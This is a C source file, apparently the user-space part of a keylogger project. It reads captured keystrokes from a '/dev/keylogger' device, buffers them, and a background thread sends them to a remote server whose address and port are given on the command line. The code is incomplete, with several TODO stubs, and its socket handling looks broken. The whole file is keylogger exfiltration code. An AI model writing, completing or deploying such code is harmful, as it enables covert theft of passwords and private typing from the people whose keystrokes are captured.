#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include "server_communication.h"

#define SMALL_BUFFER_SIZE 32
#define BIG_BUFFER_SIZE 128

int isRunning = 1;
int machineId = -1;
unsigned int interval = 3;
unsigned int bigInterval = 30;
char toSendBuffer[BIG_BUFFER_SIZE];
int toSendBufferSize = 0;
pthread_mutex_t toSendBufferMutex = PTHREAD_MUTEX_INITIALIZER;

struct sockaddr_in addr;
int connectionfd = -1;
pthread_t connectionThread;

void* connectionThreadWorker(void* nothing) {
    connectionfd = socket(AF_INET, SOCK_STREAM, 0);
    while (isRunning) {
        // wait, until big buffer empty TODO





        while(isRunning) {
            // try to connect
            while (connect(connectionfd, (const struct sockaddr *) &addr, sizeof(addr)) == -1) {
                fprintf(stderr, "Can't connect, retrying in %u seconds...\n", interval);
                sleep(interval);
            }
            // lock bigbuffer
            int status = 0;    // 0 -> not ok, 1 -> ok
            pthread_mutex_lock(&toSendBufferMutex);
            // send data TODO
            status = sendDataToServer(connectionfd, toSendBuffer, toSendBufferSize, (uint32_t *) &machineId);
            // unlock bigbuffer
            pthread_mutex_unlock(&toSendBufferMutex);
            close(connectionfd);
            // if successfully:
            if (status) {
                //   notify that bigbuffer have enough space for one small buffer TODO





                //   break
                break;
            }
            else sleep(bigInterval);
            // else: wait some time
        }
    }
}

char smallBuffer[SMALL_BUFFER_SIZE];
int smallBufferSize = 0;

int dev_fd = -1;
int totalRead = 0;

int main(int argc, char *argv[])
{
    if (argc != 3) {
        fprintf(stderr, "Incorrect number of arguments\n");
        return 1;
    }

    // read address and port
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    inet_pton(AF_INET, argv[1], &addr.sin_addr);
    addr.sin_port = (in_port_t) htons((uint16_t) atoi(argv[2]));

    // read computer id TODO

    // open device
    if ((dev_fd = open("/dev/keylogger", O_RDONLY)) == -1) {
        fprintf(stderr, "Cannot open device\n");
        return 2;
    }

    // create connectionThread
    if (pthread_create(&connectionThread, NULL, &connectionThreadWorker, NULL) != 0) {
        fprintf(stderr, "Cannot create thread\n");
        return 3;
    }

    while (1) {
        int readBytes;
        if ((readBytes = read(dev_fd, smallBuffer+smallBufferSize, SMALL_BUFFER_SIZE-smallBufferSize)) == -1) {
            fprintf(stderr, "Error reading device\n");
            close(dev_fd);
            exit(3);
        }
        totalRead += readBytes;
        smallBufferSize += readBytes;
        printf("Read %d bytes, total: %d, current size: %d big: %d\n", readBytes, totalRead, smallBufferSize, toSendBufferSize);
        if (smallBufferSize == SMALL_BUFFER_SIZE) {
            // wait until big buffer does not have space for one full small buffer TODO





            pthread_mutex_lock(&toSendBufferMutex);
            // copy to big buffer
            memcpy(toSendBuffer+toSendBufferSize, smallBuffer, SMALL_BUFFER_SIZE);
            toSendBufferSize += SMALL_BUFFER_SIZE;
            // notify, that big buffer is not empty TODO





            pthread_mutex_unlock(&toSendBufferMutex);
            smallBufferSize = 0;
        }
    }
}
